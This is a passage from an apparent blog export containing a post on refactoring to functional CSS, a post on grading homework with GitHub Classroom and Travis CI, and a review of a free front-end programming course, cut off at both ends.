&#123; color: $color-red; &#125; .c-yellow &#123; color: $color-yellow; &#125; .c-white &#123; color: white; &#125; .c-green &#123; color: $color-green; &#125; .c-grey-83 &#123; color: $color-grey-83; &#125; .c-grey-4a &#123; color: $color-grey-4a; &#125; .c-grey-bb &#123; color: $color-grey-bb; &#125; .c-grey-f8 &#123; color: $color-grey-f8; &#125; And the necessary flex layout: .flex &#123; display: flex; &#125; .inline-flex &#123; display: inline-flex; &#125; .flex-auto &#123; flex: 1 1 auto; &#125; .flex-column &#123; flex-direction: column; &#125; .flex-row &#123; flex-direction: row; &#125; .flex-wrap &#123; flex-wrap: wrap; &#125; .flex-nowrap &#123; flex-wrap: nowrap; &#125; .items-start &#123; align-items: flex-start; &#125; .items-end &#123; align-items: flex-end; &#125; .items-center &#123; align-items: center; &#125; .items-baseline &#123; align-items: baseline; &#125; .items-stretch &#123; align-items: stretch; &#125; .justify-start &#123; justify-content: flex-start; &#125; .justify-end &#123; justify-content: flex-end; &#125; .justify-center &#123; justify-content: center; &#125; .justify-between &#123; justify-content: space-between; &#125; .justify-around &#123; justify-content: space-around; &#125; In addition, you can also write some utility classes yourself: .ellipsis &#123; overflow: hidden; text-overflow: ellipsis; &#125; .limit-line &#123; overflow: hidden; text-overflow: ellipsis; display: block; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; &#125; .pointer:hover &#123; cursor: pointer; &#125; This echoes what I mentioned earlier, that a class name can actually have more than one rule, as long as you can clearly know what it is doing from the class name. The process of refactoring is actually very fixed, basically these steps: Select the component to be refactored. Start from the innermost layer, right-click to inspect, and make sure that this class name has no other side effects. Replace the original style with functional CSS. Remove the original class name. During this process, you can also standardize the website’s style, such as changing all padding from 5 to 4, etc., so that the website will become more and more standardized. However, during refactoring, you may also encounter some difficulties, such as some CSS written before that did not consider maintainability for the sake of convenience, and in the end, this pit still falls on you. For example, there is a component called Card, and the requirement is that its padding is different on the homepage and the restaurant page, so it was written like this before: // home_page.scss .home-page &#123; .card &#123; padding: 10px &#125; &#125; // restaurant_page.scss .restaurant-page &#123; .card &#123; padding: 15px; &#125; &#125; // card.scss .card &#123; padding: 20px; &#125; What’s the problem? The problem is that if you only look at the CSS of .card, you won’t notice that it has different padding on different pages! If it’s just padding, the problem is small, but if you continue to write according to this logic, it may even change the color and margin, like: .home-page &#123; .card &#123; padding: 10px &amp;__title &#123; margin-top: 20px; background: red; &#125; &#125; &#125; This approach puts the display logic in CSS and uses CSS to manipulate it, so there is no need to write anything extra in JS. The Card component will have different styles in different places. But later I realized that this is not a good practice. The logic should be moved back to JS, so I changed it to this: // home page &lt;Card type=\"home\" /> // restaurant page &lt;Card type=\"restaurant\" /> // Card component function Card(&#123; type &#125;) => ( &lt;div className=&#123;cx(&#123; 'padding-20': !type, 'padding-10': type === 'home', 'padding-15': type === 'restaurant' &#125;)&#125; /> ) I use the component’s props to distinguish between different places, and put this logic inside the component. Compared with the CSS approach, there are pros and cons, but at least it can ensure that when I render a simple &lt;Card /&gt;, its style will be consistent on any page, without worrying about suddenly appearing different styles in different places. In the process of refactoring, I actually found many such problems. If they are not removed early, CSS will only become more and more and more chaotic, and it will become super difficult to maintain. It is easy to accidentally break two places by changing one class, causing a ripple effect. Therefore, I took the opportunity to deal with these issues when rewriting to functional CSS. Many people have a misconception about functional CSS, that is, they cannot write “other” CSS. For example, I mentioned earlier that functional CSS is a separate specification and cannot be used for things that are not written as classes, but in fact, some special cases are still possible. For example, if you have a div with a height of 333px, do you have to write a .height-333 class for it? If that’s the case, it’s really no different from inline style. But the point that functional CSS considers should be “can it be reused”. Only things that can be reused are written as class names. For example, for a height of 333px, I will directly use styled-component or even write inline style. I won’t give it a .height-333 class because the entire App may only need it. Finally, let’s take a look at the results of the rewrite. This is before the rewrite, CSS is about 400kb (before gzipped): This is after the rewrite. You can see that all the data has decreased a lot, and CSS is about 130kb. It can actually be smaller, but it is larger because there are some small pictures converted to base64 inside: After the rewrite, the CSS volume was reduced by nearly 70%. And the key is that no matter how much the App grows in the future, the CSS can be maintained at about the same size, because the commonly used attributes have been turned into class names. The difficulty of rewriting depends on the quality of your original CSS. For example, many of our CSS are high due to the need for speed and lack of consideration for coupling. Often, two or three CSS files need to be referenced to piece together the final style. But if this problem is handled well in the first place, the speed should be much faster. But overall, rewriting is still relatively easy, and it feels great to delete a bunch of CSS rules directly after each rewrite. Interested friends can use this website to test their own products: https://cssstats.com/. SummaryIf you want to say what are the shortcomings of functional CSS, the ones I can think of now are that it takes some time to learn at the beginning, and if there are many styles, the HTML will be full of class names, which is harder to read and the file is larger. But overall, I still think that the advantages outweigh the disadvantages. The advantages have been mentioned before, basically it is not necessary to worry about the coupling problem of CSS. There will never be a situation where changing one class name will break two components, because each class name will not interfere with each other. It can also ensure that when you move this component to any place, it still looks the same, and there is no special CSS behind it. You don’t have to worry about how to name class names anymore because you don’t need to. This can save a lot of time. You don’t have to write CSS by hand anymore, so the development speed is faster because you don’t have to switch between CSS files and components. You can write the style while writing HTML, save it, and then adjust it after seeing the interface. Compared with before, there are fewer steps. Actually, I don’t have much experience with CSS, and there may be many cases that I haven’t considered or advantages and disadvantages that I haven’t explained clearly. If you want to study functional CSS more deeply, the resources I provided at the end of my article are very valuable references that you can check out. But anyway, I am now one of the supporters of functional CSS. References: In defense of Functional CSS Tachyons Full re-write in 10 days with tachyons and functional CSS: A case study Tailwind: style your site without writing any CSS! CSS Utility Classes and “Separation of Concerns” Discussion on HN","link":"/2019/01/27/en/functional-css/"},{"title":"Using Github Classroom and Travis CI to Build a Homework Submission System","text":"IntroductionRecently, I started a side project called Lidemy Mentor Program, hoping to train students to become employable engineers within four months. As Git is one of the essential skills for engineers, it is reasonable to use Git to submit homework and cultivate students’ familiarity with Git. But the question is: how to submit homework using Git? Previously, I opened another front-end course, and I let the students create a Github repo to submit their homework and set up a Github page so that I could see their source code and the results displayed on the webpage. Then I set up an Issue template, and after the students finished their homework, they opened an issue to submit it, as shown in the figure below: The advantage of this approach is that I can manage all the homework in one place, and it is easy to see who has submitted which homework and the status of each homework: However, the disadvantage is also apparent. As a teacher, it is challenging to “grade” the homework. That is, if I want to point out where the students wrote incorrectly, I can only leave a comment in the issue, copy its original code, and tell them how to modify it: Overall, the experience of grading homework is still good, and there are no significant problems. However, since I started a new course this time, I was thinking about whether there is a better way to optimize this process. New Homework Submission ProcessWhen designing the course, I always think about what I have used in my work and move the good and portable systems to the course. The purpose behind this is to let the students understand these things first and seamlessly connect them when they enter the workplace in the future. But sometimes I don’t tell them that this is the process they may encounter in their work, hoping that they will exclaim when they really encounter it: “Wow, the exercises I did in the course are actually things that will be used in work!” For example, because this new course requires students to participate every day and self-study when I am not in class, and the company happens to be running Scrum, which requires a Stand-up meeting every morning and sending a short note in slack before starting, I introduced this system into the course. *昨天* - 完成 git 安裝 - 解 codewar 題目：Opposite number *今天* - 解 codewar 題目：Opposite number - 寫作業：好多星星 Every day, I ask students to post what they did yesterday and today in the slack group. Although it is still far from the actual Stand-up meeting, the original intention is the same: “Organize your progress and let everyone know your progress.” Adhering to the same concept, I decided to use Github Flow for the homework submission mechanism. What is Github Flow? You can take a look at the picture I took on the official website: Simply put, if you want to make any changes, you need to follow the following principles: Create a new branch Submit a Pull Request Wait for review Confirm that there is no problem and merge it into the master Our company also uses a similar workflow, so I am quite familiar with this process myself. What are the benefits of this process? When submitting a PR, you can easily see the changes and suggestions: Isn’t this the most suitable way to grade homework? You can directly add comments, correct them line by line, approve the qualified homework directly, require correction for unqualified homework, and then submit a review again. Once you have decided to use the PR method to submit your homework, there is still one thing to decide: how to send the PR. In other words, where should the PR be opened? There are several ways to do this: The teacher opens an hw repo, grants permission to all students, and students send PRs to hw after completing their homework. Students open an hw-student repo, add the teacher as a collaborator, and send PRs after completing their homework for the teacher to review. For the former, you must open different folders under hw so that each student has a place to put their own homework. The advantage is obvious, that is, everything is managed in the same place, but the disadvantage is that this repo will become very large because you may need to put the homework of 10 students at the same time. For the latter, students open their own repo, add the teacher to it for review, which is more decentralized, but has much higher freedom, and after the course is over, students can directly use their repo as part of their portfolio. I prefer this one compared to the former. In addition, there is actually another problem that needs to be solved, which is that sometimes homework has a fixed format to follow. For example, I have some short answer questions and have already opened a template for answering under hw. Students only need to write the answer according to the format, so students must copy this template to their own repo, which is actually quite troublesome. What is a better way? It’s very simple, it combines the previous two: The teacher opens a repo for the homework template, and students fork this repo to their own account and use this forked repo to submit their homework. This way, students don’t have to start from scratch and can directly use the homework template and format that the teacher has already written. And this processing method is actually what we will mention later, Github Classroom. Github ClassroomWhen I first saw this, I thought it was some magical system that could automatically help you complete a lot of things related to homework. But unfortunately, it is not. The Github Classroom system is very simple. First, you need to register an organization to use it. After entering, you can create a Classroom, which means a course. Under each course, there is a place where you can add assignments. When adding assignments, you can associate the repo under your own account. The interface looks like this: The associated repo is the repo you use to submit homework, so you can write a lot of things first, such as the rules and format for submitting homework. For me, I will first open the file, and students only need to write the answer under the specified file: After adding the assignment, there will be an automatically generated invitation link. After the student clicks and joins, a new repo will be automatically generated under your organization. For example, the repo I used for association is called mentor-program, and the student’s account is abcd, so a mentor-program-abcd will be generated, and this repo is based on what you originally generated, so everything is exactly the same. After it is generated, it will automatically set the student and the teacher as collaborators, and the student only has developer permissions, while the teacher has admin permissions. Therefore, the advantage of using Github Classroom is that there is an automated system to help you fork a copy of your repo to the student, and automatically set permissions, and you can see each student’s repo in the background: At this point, you have a very good homework submission system, and the process is very simple: Students join through the invitation link generated by Github Classroom. A mentor-progam-student_username repo is generated. Students clone it, open a new branch, and write their homework. Send a PR after completing the homework. The teacher reviews it, confirms that there are no problems, and then merges it. Combining CI to automatically grade homeworkAs mentioned earlier, your students’ repos are all forked from what you provided, so students can write homework according to the rules you set. In the example I just mentioned, I first opened hw1.js, hw2.js, etc. for the students, and they just need to write the answer in the file. If you noticed, I also opened hw1.test.js for them, which is used for unit testing. In the first week’s homework, they were asked to implement several simple functions, such as judging prime numbers, judging palindromes, etc. So each js file only exports one function. How to verify it? Run the test! Since these are such simple functions, we can write unit tests to verify the results are correct. At this point, I thought we could combine CI to create an automatic homework grading system. The process is simple: Students submit a PR. CI is triggered and automatically runs tests on the PR. The results are displayed in the PR. The completed result will look like this, and you can see the results of the CI running tests directly in the PR: The system I used is the well-known Travis CI. It’s easy to use. After logging in, it will automatically grab your repo, and you can see a list. Just check the box to connect Travis to Github: Before checking the box, you need to configure your repo. The principle of CI is simple: you provide some commands for it to run. For my course, it’s just running npm run test. Just add .travis.yml to the root directory of the project to specify the environment and other parameters you want to run. For example, in my project: language: node_js node_js: - \"node\" cache: yarn before_script: - wget $TESTCASE_URL notifications: email: false Travis is smart, so it defaults to running npm run test, so you don’t need to set anything here. You can see that I set before_script here, and the parameters following it are the commands you want to execute. I set it up this way because I want the test files in the repo to be available for students to practice on their own, and they can modify them freely. The tests I use to grade the homework are stored remotely and are only retrieved when running CI to ensure that students cannot modify them. After preparation is complete, just check the box in the CI backend and adjust some settings (such as only running tests for PRs, adjusting environment variables, etc.), and everything is done! ConclusionBy combining Github Classroom and Travis CI, we can easily create a system that allows students to submit homework and allows teachers to easily grade homework, even allowing the system to automatically grade homework. If you want to go further, there are many extended applications that can be done on the CI side, such as automatically closing PRs if tests fail, or automatically responding to which homework is incorrect. You can even record these messages and create a scoreboard for students. There are many interesting applications to play with. But if you just want the basics, simple settings are enough. This article summarizes the process of grading homework in my recent course. It works well because it allows me to easily grade homework and forces students to become familiar with the Git process, and they will become more proficient over time. If you have any better suggestions, please leave a comment below, and if there are any errors in the article, please let me know. Thank you.","link":"/2018/02/03/en/github-classroom-and-travis-ci/"},{"title":"A Free Programming Experiment for Thirty People: Results and Review","text":"BackgroundThree months ago, I posted on PTT ([Sharing] Free Programming Tutorial (Front-end)) saying that I was willing to provide a series of free front-end programming tutorials. Anyone with a web foundation could sign up, and I welcomed everyone to write to me with a few answers to some questions. Finally, I would select 5-10 people for training. The questions are as follows: Self-introduction (such as background, how to learn programming, programming ability) How long have you been learning programming, and why did you want to learn programming in the first place? Are you currently working? If so, what is your job content? The most difficult programming problem you have encountered recently What kind of assistance do you hope I can provide? The article was posted on March 2nd, and the deadline for registration was March 11th. I would send an email to the people I selected before March 15th. First, let’s talk about why I wanted to offer this free programming tutorial! Actually, it was also mentioned in the original article, but I’ll explain it more clearly. Before this, I had actually organized a similar event before, although it was also a programming tutorial, the people who came to me were all inexperienced beginners. I could only give them some general advice, such as introducing them to front-end and back-end, introducing several programming languages, and recommending suitable ones for beginners. The last tutorial probably involved about ten people, but almost none of them “really wrote code,” and they only stayed at the stage of “wanting to learn programming but haven’t started yet.” But that’s not what I want. What I want is to actually let the students write code and verify whether “my method” is really effective. As for what this method is, we’ll talk about it later. Therefore, this tutorial limited students to “having a front-end programming foundation,” which means I can teach them more in-depth things. Exploding InboxThe response on PTT after the article was posted was okay, with about 30 likes, which is quite a lot for a smaller board like the software job board. However, the number of people who signed up far exceeded my expectations. By the deadline for registration, I received a total of 42 emails. This is four to eight times the number of people I originally wanted to recruit (I only wanted to recruit 5-10 people), and many of them wrote very well. In fact, from these emails, you can see the personality of each person. Some people are lazy and just write three or four lines and send them over; some people are very serious, even providing resumes or carefully formatting them. So what should I do? How do I screen the people I want from them? Forget it, it’s too troublesome, just take them all! Yes, that’s really what I thought. So after rejecting the four people who were really unsuitable, I finally recruited 38 people. Below is the acceptance letter I sent to everyone: Hi, Receiving this email means you have been accepted. But actually, I feel a bit strange saying “accepted,” because it’s not a formal event. The purpose of organizing this programming tutorial is purely because I hope that when I first came into contact with front-end and back-end web programming four or five years ago, someone could have taken me under their wing and given me some advice. But that person never appeared, so after four or five years, I decided to jump down and be that person myself. I have received a lot of help from my predecessors on the road of programming, and Google and Stackoverflow have also been very helpful to me. It’s because I have received help from so many people that I have always felt that “giving back” is something I must do. The preface is almost over. This email is a unified reply to everyone, and I will introduce the direction of this event later. The registration for this event was more active than I expected, with about 40 friends interested in this event. Although the article originally said that only 5-10 people would be accepted, after careful consideration, I found that everyone’s needs are different, and basically, the needs can be divided into two categories. The first category is to practice front-end basics, hoping that I can give assignments or some guidance; the second category already has front-end programming ability and hopes to talk to me about work-related matters, such as how I came to work in Singapore, what level I need to achieve, and so on. For these two types of needs, there will be two ways to proceed. For the first category, there will be an assignment every week or every two weeks (or it may be changed to all assignments being prepared in advance, and everyone can have their own progress), and then at a fixed time, I will explain the knowledge points that you should be able to learn from this assignment, plus some of my own supplements. For the second category, there is basically no problem with ability, and I have nothing to teach, so the main thing is to make an appointment with you and chat. It’s like attending a technical sharing meeting and chatting with the person next to you. There is no need to have too much pressure, and chatting may also reveal that your technical ability is stronger than mine. Everyone has already sent me a simple self-introduction email, and now it’s my turn to introduce myself briefly. My name is Hu Li, and I am currently a front-end engineer in Singapore, having been here for about five months. I started learning programming when I was in junior high school, and mostly self-taught along the way. I wrote VB when I was young, then moved on to C&#x2F;C++ for programming competitions, and later became interested in mobile app development with Java and Android. In college, I finally embarked on the path of web development, learning PHP and front-end web development. During my internship, I realized that I was more interested in front-end development, so I started to focus more on front-end and Node.js back-end development. For more detailed information, you can refer to my LinkedIn: https://www.linkedin.com/in/hulii. You don’t have to be too formal when communicating with me, just call me huli or Huli Li. If it’s too formal, I’ll feel a little strange. XD Regarding this tutorial, there are a few things I want to explain: You can “quit at any time” because you may have overestimated my abilities and found that I’m not as strong as you thought during the actual tutorial. If you feel that I can’t help you, you can tell me directly or come up with any excuse. Don’t worry, there’s no pressure. Please give me feedback. Whether I teach well or poorly, please give me some feedback. I will create an anonymous Google form for everyone to fill out, and I would appreciate it if you could give me feedback after the tutorial. Learning still depends on yourself. Although I may give you some direction and advice, ultimately it’s up to you to practice and improve. There are two things I need your help with to get started: Join Slack (if you haven’t used it before, you can Google a tutorial). Fill out the basic information form on Google (this is super important, please fill it out). Slack will be our main communication channel, so please turn on Slack notifications. If I don’t reply to you on Slack, you can try contacting me again or send me an email. We have about three weeks until April, and during this time, I will try to chat with “everyone” as much as possible. If you are the second type, just want to chat with me, then our fate (?) will probably end after the chat, because I won’t have much else to offer. XD If you are the first type and need tutoring, I will briefly chat with you based on your previous self-introduction, and we will also discuss your expectations for this tutorial and what specific help you need. The tutorial is expected to start in early April, and I will update everyone on the latest situation. Below is the preliminary outline for the first type of tutorial. If you think you already know all of these, then there’s no need to listen to my tutorial, because that’s all I can teach. XD I am more proficient in JS than CSS, so friends who expect to learn some amazing CSS skills may be disappointed. I’m not very good at layout design and RWD, so I can’t provide much help in that area. Practice implementing Twitch game screen layout (knowledge points: basic HTML, CSS) Make the screen more dynamic (knowledge points: CSS transition) Use Less, Sass, or Stylus (knowledge points: using CSS preprocessors) Connect to Twitch API to retrieve data (knowledge points: understanding API documentation, API integration, Ajax, CORS) Optimization: add infinite scroll and placeholder (knowledge points: infinite scroll, placeholder) Use vanilla JS (knowledge points: vanilla JS) Add multilingual support (knowledge points: i18n, library) Inline all CSS and JS into HTML (knowledge points: gulp, why we need gulp) Why do we need Webpack? (knowledge points: Webpack) Use React.js (knowledge points: React.js)(Additional tutorials on Redux, React-router, etc. may be added depending on the situation, as the tutorial content may change and I haven’t planned that far ahead.) To summarize the current situation: Join Slack and fill out the Google form. I will chat with everyone, but you can choose whether or not to participate in my programming course after the chat (meaning you can choose the first type). Wait for me to contact you and chat online. Wait for the notification to start the course. Thank you for your cooperation,Huli In the first two weeks, I chatted one-on-one with about 20 classmates, about 70% using voice and 30% using text, to discuss each other’s situation, when we started learning programming, our level of proficiency, and our thoughts on the course outline. The most important thing about this course is the course outline. Let’s take a closer look! The meaning behind the course outlineThe reason for creating this course outline is mainly due to two factors. First, the things taught in the course are all related to my recent work, so I will be more familiar with teaching them since I’m already working with these things. The second reason is that when I encountered these things in my work, I didn’t know anything about them. I didn’t know what Webpack was doing, what Gulp was doing, or how to implement infinite scroll. But after spending some time understanding them, I realized why I found them so difficult at first. Because I didn’t know where to use it, I didn’t know what it was for, or in other words, I didn’t know “why I should use it.” I searched a lot of tutorials on the internet, and each one was telling me “how to use it,” but there was little information that could tell me: “why to use it” and “what will happen if I don’t use it.” After accumulating several teaching experiences, I found a teaching method that I think is more effective, and the principle is: You have to experience pain before you can gain something. What does this mean? For a while, I liked to read some architecture articles from big companies, which wrote about how they adjusted their machine architecture to be suitable for scaling, and how they encountered problems and solved bugs caused by large amounts of data. At first, I felt that I gained a lot: “Wow, these things feel so powerful, I learned a lot.” But after a while, I realized that I didn’t learn anything. I forgot all those things after a week, as if I had never read the article. Later, I forgot where I saw an article, but I remembered a passage that conveyed a message that was particularly profound (if someone has also read the same article, please leave a comment below, I would be very grateful). The article wrote that those were the “essences” that the experts of big companies had painfully experienced and tempered. How could you expect to have their ten years of experience after watching for ten minutes? “Pain” is a very important thing. Instead of teaching them how to write SCSS directly, it is better to let them write CSS first, and then keep asking them to change colors and change things. At this time, they can only keep searching and replacing with text editors, repeating this cycle. When you confirm that they are really in pain, then teach them SCSS. At this time, they will have a feeling of “rebirth”, “Damn! I didn’t know there was such a thing. I don’t have to change it so hard anymore. I can use variables.” I think this way of learning will be much more effective than teaching directly. Before teaching them the same thing, I will definitely find a way to let them know: “Why do I need this?” I think that when this question is understood and agreed upon, they will be more motivated to learn, and they will also know what they are learning and what they can do after learning. There is another thing, which is that instead of doing different small assignments, it is better to do a “gradually strengthening assignment”. In this way, when doing assignments, students can constantly see their progress, constantly see the growth of the project, and finally make a complete project, instead of a bunch of fragmented, broken small projects. Therefore, I planned these course outlines based on these concepts, and made some adjustments later: Basic HTML&#x2F;CSS practice: using Twitch as an example Make the screen more dynamic: magical CSS transition Essential tool for writing CSS: CSS preprocessor From fake data to real data: Ajax and API integration Make the webpage more complete: add placeholder and infinite scroll Back to basics: vanilla js Towards internationalization: i18n When we are bundled together: Webpack Extreme saving of requests: one for all, all for one Change your bad habits: ESLint and standard The tenth week was originally React.js, but I later removed it for two reasons. The first is that I think React is not suitable here, it is not yet the time to teach, and it is not related to the previous ones. The second is that I found that many people’s coding styles were not good when I changed the assignment, so I put this one in the tenth week, and the uglier the assignments in the previous nine weeks, the more time they will spend on fixing them, so that they can “suffer” a bit. I must admit that this plan did not use the teaching principle of “pain before gain” very well, which is an area where I can do better and there is still a lot of room for improvement. I think I have mastered the process of gradually optimizing from a small assignment. At the beginning, let them carve a static page, then change the CSS to SCSS, and then change the fake data to real data and integrate the API. Then add placeholder images and infinite scrolling to make the channel continuously scroll and load. The purpose of the sixth week’s assignment is to abandon jQuery, save file size, and let them know that they can still write JavaScript without relying on jQuery. In the seventh week, change Chinese to bilingual, supporting two languages. In the eighth week, use webpack to implement modularization. In the ninth week, use gulp to let them know that many things can be automated. Finally, in the last week, correct their own coding style. In this way, the process of gradually optimizing, they can directly follow up on the next assignment, and make a project more and more complete. Problem SolvingAs I have repeatedly emphasized, writing code is not the focus, the focus is on “problem solving,” and almost all the focus is on this. Problem solving can be divided into the following points for thinking: What problem do you want to solve? What method do you use to solve it? What are the advantages and disadvantages of this method? I like a term called trade-off, which can be translated into Chinese as: trade-off, choice. Especially in the field of programming, what you do is actually a trade-off. The most common example is trading time for space or space for time. There is no such good thing that you can have both space and time. Well, actually there is, but that’s what money is for. In the instructions for each week’s assignment, I will mention what problems we encountered this week. What about the solution? The solution is of course what we will teach everyone this week. Let’s take a closer look at each week’s course, and ask and answer the above three questions (what problem to solve, how to solve it, advantages and disadvantages): Basic HTML&#x2F;CSS Practice: Using Twitch as an Example Problem to solve: I want a page where I can watch Twitch channels. Solution: Write my own webpage. Pros: Customizable. Cons: Time-consuming. Making the Page More Dynamic: The Magic of CSS Transition Problem to solve: I want to add effects to make the page more refined. Solution: Use the CSS transition property to create a gradient effect. Pros: Has a gradient effect. Cons: May have performance issues. Essential Tool for Writing CSS: CSS Preprocessor Problem to solve: Writing CSS is too complicated. I want to use variables like in programming. Solution: Use a CSS preprocessor. Pros: Easy to maintain. Cons: Requires an extra step to compile. From Fake Data to Real Data: Ajax and API Integration Problem to solve: Current data is pre-written. I want real data. Solution: Integrate with Twitch API. Pros: Data becomes real. Cons: Slower loading speed. Making the Webpage More Complete: Adding Placeholder and Infinite Scroll Problem to solve: Loading 100 channels at once is too slow and causes layout issues. Solution: Use the method of loading new channels only when scrolling to the bottom, and add placeholders to prevent layout issues. Pros: Improves user experience and faster initial loading. Cons: Increases the number of requests. Back to Basics: Vanilla JS Problem to solve: jQuery file size is too large. I want to reduce request size. Solution: Remove jQuery and do not rely on any library. Pros: Reduces file size. Cons: Increases code complexity and requires handling cross-browser issues. Going International: i18n Problem to solve: I want to add a new language. Solution: Put the language in a language file and pass it through the global variable “window”. Pros: Can have multiple languages. Cons: Pollutes global variables. When We Are Together: Webpack Problem to solve: Solving the global variable pollution in the previous homework and wanting to use the “require” syntax. Solution: Import Webpack. Pros: Modular development. Cons: Requires an extra layer of packaging and increases file size. The Ultimate Way to Save Requests: One for All, All for One Problem to solve: Too many requests. Solution: Inline all JavaScript and CSS into HTML. Pros: Reduces requests. Cons: Slower page loading time. Breaking Bad Habits: ESLint and Standard Problem to solve: Bad coding habits that are not conducive to team development. Solution: Introduce syntax checking tools. Pros: Uniform code specifications. Cons: …seems to have no disadvantages. Compared to an introduction like “Webpack is a packaging tool,” letting beginners know what Webpack is for, what problems it solves, and how to solve them is much more useful. Once again, emphasizing why is important, knowing why is also important. Knowing the reasons behind it, you can decide whether or not to use this solution. When you use something, there must be a “good reason” behind it. A: Let’s switch to TypeScript.B: Why?A: Because it’s trendy! If the reason “trendy” is not convincing enough and A cannot come up with better reasons, then there is no need to switch to TypeScript. There was a very popular article before called “What is it like to learn JavaScript in 2016?” I think there is a regrettable point, that is, some people’s feedback after reading it is only: “Ah, yeah! Front-end development is too complicated now!” But I think what you should think about after reading this article is: “Do I really need to use those tools? Are the problems those tools want to solve really the problems I encounter?” This is the focus of this article. For example, there is a paragraph that says: Don’t use jQuery! Who still uses jQuery now? It’s 2016, you should definitely use React. This reason is as weak as the one above, one word: trendy! Of course, it may also mean something else, such as expressing that React is a recent trend, jQuery may be gradually phased out and no longer maintained, and there will be maintenance issues in the future. At this time, you can consider: Is this situation possible? If it really happens, what will be the impact? Which one has less damage, the complexity brought by using React or the maintainability of jQuery? In short, the focus should be on “what problem you want to solve, which tools are best suited to assist,” rather than blindly thinking that front-end development is so complicated and there are so many things to learn. Yes, there are a lot of things, but you may not need most of them! If you insist on using React + Redux + Rx + Webpack for a one-page marketing landing page, then I am speechless. Course ProgressThe course progresses as follows: as mentioned above, there are a total of ten assignments, one per week. You must “complete the assignment first,” but it’s okay if you can’t. Every Tuesday, I will live stream and explain the previous week’s assignment and demonstrate how I would do it. This is because “self-learning” is an important skill in any field. I want students to have a concept of what I am teaching, and even after completing the assignment, I will explain it again. I think only in this way can students become more familiar with what I am teaching. This echoes what I mentioned earlier, “you have to suffer first before you can gain.” Many students have responded that they found some things difficult during their pre-class preparation, and they couldn’t understand them no matter how they looked at them. But after watching my live teaching, they had a feeling of enlightenment: “Wow! It’s so simple.” What if it were the other way around? If I taught first, they would only think, “Oh, that’s how you write it,” and then just copy my solution when doing the assignment. What did they learn? They learned to imitate my code, and then forget about it completely after a week. Why? Because they didn’t suffer, so they didn’t think. Again, I emphasize that you must think when you write code! Think! Think! Only things that have been deeply thought about are truly yours, and you will remember them. Course EffectivenessAfter discussing the design concept of the course outline and the core ideas I want to convey in this course, let’s talk about the effectiveness of this course. As mentioned earlier, 38 people received acceptance letters, but only 36 people filled out their basic information, and two people disappeared. Among these 36 people, only 26 completed the first assignment, meaning that 10 people didn’t even do the assignment, and 28% of the people disappeared. Therefore, I will adjust the number of people participating in this course to 26 in the future data. Only 8 out of 10 people were able to complete the assignments, which is about 30%. The graph below shows the number of people who completed each assignment. It can be seen that the most significant drop was from hw2 to hw3, where the essential tool for writing CSS, CSS preprocessors, was introduced, and many people dropped out for some reason. After the course, the feedback questionnaire revealed that the reasons for not completing the assignments were: inability to allocate time, high difficulty, laziness, other things to do, and lack of interest. One of the questions in the questionnaire was: “Which assignment do you think was the most challenging?” Most people answered hw5 (Making the webpage more complete: adding placeholders and infinite scrolling) and hw6 (Back to basics: vanilla js) because they had never written anything similar before. If there is a need for improvement in the future, hw5 can be divided into several units instead of completing these two items at once, and the same method can be applied to hw6. This way, the difficulty will not jump so much for students, and it will gradually become more challenging. Student FeedbackAfter the course, everyone was asked to fill out a feedback form, and fortunately, everyone had a lot to say. I originally wanted to post the entire original text, but it would be too long and hinder reading, so I only selected some parts and deleted some repetitive content. What are the advantages of the teacher’s explanation or assignment modification?(The following are feedback original texts, and I only made some formatting changes.) The use of Youtube live streaming for lectures can allow students to flexibly arrange their time to listen to the lectures. The content of the lectures has a significant advantage that Huli uses very straightforward examples and concepts to introduce them, making it easy for students to understand. After spending one or two days on an assignment, I sometimes feel that “Wow, it’s not as difficult as I thought” after listening to the lecture. The arrangement of each lecture is organized and easy to take notes. Regarding the modification of assignments, Huli will carefully look at the troubleshooting I have listed and provide useful suggestions. When doing well, he will also give full encouragement, which is excellent guidance for beginners. When explaining, Huli talked about many things that I was prepared to ask, and the way of explanation is easy to understand. Because the reasons are explained, it is easy to accept. Just like arranging the course, each chapter is progressive, so it is easy to understand and accept why to use these things and the usefulness of these things. Although I only submitted the first few assignments, I can see that he was attentive in reviewing them. Regarding the lectures, I think they are excellent and there are no awkward moments. The lectures are also very clear! The complete program live coding process is broadcasted, including executing commands using the terminal, which makes me, a terminal novice, no longer afraid to use the terminal and become more familiar with it. The process of explaining the program makes people feel that writing programs can be so clear and simple. The explanation process seems easy but has a structure. When classmates don’t understand, he will explain from many different angles, such as real-life examples or various related links, to deepen students’ understanding and impression of the program! What are the shortcomings of the teacher when explaining or grading assignments? There are not many shortcomings, but if there is room for improvement, the IDE color theme could have stronger contrast between the font and background to enhance the user experience. However, overall it is not a big issue. If possible, the teacher could prepare a text file with the key points to be discussed that day and use them as headings. When the course content, such as webpack and gulp, is completely unfamiliar to me and I have not touched node.js, I feel that the explanation speed is too fast. Especially during live classes, when the teacher says that the webpack and gulp assignments are easy, it can be frustrating for beginners like me. I hope to develop the ability to quickly learn new things. This is not a shortcoming, just a suggestion. To save time during live classes, the teacher could prepare the websites that may be needed in advance. However, the benefit of searching directly during the live class is that we can know what keywords you used to search later. Course FeedbackDue to the length of the feedback questionnaire, it is not suitable to post it here. Therefore, I will only post two articles that I wrote on my own blog. Frontend Intermediate Course - Learning Experience Experience｜Huli’s Frontend Intermediate Course｜Origin and Harvest Self-reflectionFirst, let’s talk about the shortcomings. Actually, compared to the strengths, I would like to hear more about the shortcomings. Knowing where the shortcomings are is the only way to continue to improve. However, I don’t know if it’s because the performance was too good this time or the students were too shy, but there was less feedback on the shortcomings. As a teacher who constantly strives for improvement, even if the students don’t speak up, I should be able to detect some shortcomings myself. 1. Sometimes grading assignments is careless.Although the students said that the teacher graded the assignments carefully, sometimes when facing a pile of more than ten assignments, many things are just quickly glanced over. After all, teachers can also be lazy… This is an area where I can improve in the future. 2. The course planning is not “painful” enough.As I mentioned earlier, you have to experience pain before you can understand. I think the assignments can be broken down into smaller parts to make the students feel more “pain”. For example, in the part of cultivating coding style, you can first set a rule for everyone: “Variable names can only use one English word, such as a, e, y, etc. If it is not enough, add a number to become a0, etc.” After completing the assignment, let everyone look at the program they wrote last week after two weeks. They should find that they can’t understand what they wrote. At this point, they will know the importance of variable naming. Now let’s talk about the strengths. I mentioned earlier that this was a “30-person teaching experiment”, and the goal of the experiment was to verify whether the teaching concepts I mentioned above (you have to experience pain, understand the purpose, and know why) can really help students learn. From the feedback from the students, I think it can, which also confirms the direction of my future course planning. Regarding the strengths, I will directly post some feedback from the students! From these feedbacks, you can see that they can really receive the message I want to convey. When 